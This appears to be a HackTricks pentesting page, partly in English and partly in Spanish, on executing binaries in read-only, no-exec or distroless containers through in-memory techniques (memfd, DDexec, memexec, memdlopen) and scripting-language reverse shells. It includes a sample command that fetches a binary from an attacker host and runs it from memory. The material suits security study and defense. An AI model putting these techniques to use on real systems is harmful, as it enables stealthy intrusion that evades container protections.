# Bypass FS protections: read-only / no-exec / Distroless

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_se requiere polaco fluido escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videos

In the following videos you can find the techniques mentioned in this page explained more in depth:

* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## read-only / no-exec scenario

It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.

{% hint style="warning" %}
From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
{% endhint %}

## Easiest bypass: Scripts

Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.

However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.

## Memory Bypasses

If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.

### FD + exec syscall bypass

If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.

For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.

{% hint style="warning" %}
This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.

Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.

Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.

{% hint style="success" %}
**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para más información sobre esta técnica, consulta el Github o:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) es el siguiente paso natural de DDexec. Es un **DDexec shellcode demonizado**, por lo que cada vez que quieras **ejecutar un binario diferente** no necesitas relanzar DDexec, solo puedes ejecutar el shellcode de memexec a través de la técnica DDexec y luego **comunicarte con este demonio para pasar nuevos binarios para cargar y ejecutar**.

Puedes encontrar un ejemplo de cómo usar **memexec para ejecutar binarios desde un reverse shell de PHP** en [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con un propósito similar al de DDexec, la técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite una **manera más fácil de cargar binarios** en memoria para ejecutarlos más tarde. Podría incluso permitir cargar binarios con dependencias.

## Bypass Distroless

### Qué es distroless

Los contenedores distroless contienen solo los **componentes mínimos necesarios para ejecutar una aplicación o servicio específico**, como bibliotecas y dependencias de tiempo de ejecución, pero excluyen componentes más grandes como un gestor de paquetes, shell o utilidades del sistema.

El objetivo de los contenedores distroless es **reducir la superficie de ataque de los contenedores al eliminar componentes innecesarios** y minimizar el número de vulnerabilidades que pueden ser explotadas.

### Reverse Shell

En un contenedor distroless, es posible que **ni siquiera encuentres `sh` o `bash`** para obtener un shell regular. Tampoco encontrarás binarios como `ls`, `whoami`, `id`... todo lo que normalmente ejecutas en un sistema.

{% hint style="warning" %}
Por lo tanto, **no** podrás obtener un **reverse shell** o **enumerar** el sistema como lo haces normalmente.
{% endhint %}

Sin embargo, si el contenedor comprometido está ejecutando, por ejemplo, un flask web, entonces python está instalado, y por lo tanto puedes obtener un **reverse shell de Python**. Si está ejecutando node, puedes obtener un reverse shell de Node, y lo mismo con casi cualquier **lenguaje de scripting**.

{% hint style="success" %}
Usando el lenguaje de scripting podrías **enumerar el sistema** utilizando las capacidades del lenguaje.
{% endhint %}

Si no hay protecciones de **`read-only/no-exec`**, podrías abusar de tu reverse shell para **escribir en el sistema de archivos tus binarios** y **ejecutarlos**.

{% hint style="success" %}
Sin embargo, en este tipo de contenedores, estas protecciones generalmente existirán, pero podrías usar las **técnicas de ejecución en memoria anteriores para eludirlas**.
{% endhint %}

Puedes encontrar **ejemplos** sobre cómo **explotar algunas vulnerabilidades RCE** para obtener **reverse shells** de lenguajes de scripting y ejecutar binarios desde la memoria en [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si estás interesado en una **carrera de hacking** y hackear lo inhackeable - **¡estamos contratando!** (_se requiere polaco fluido escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
